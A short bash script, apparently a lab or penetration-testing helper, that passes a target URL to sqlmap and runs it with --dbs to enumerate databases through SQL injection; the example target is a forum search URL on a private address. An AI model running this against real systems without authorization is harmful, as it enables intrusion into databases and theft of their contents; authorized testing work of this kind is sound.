#!/bin/bash
#Target in format "http://192.168.1.202/?p=1&forumaction=search"
export TARGET=$1
shift # Shift positional parameters to the left (i.e., $2 becomes $1, $3 becomes $2, etc.)
sqlmap -u $TARGET --dbs "$@"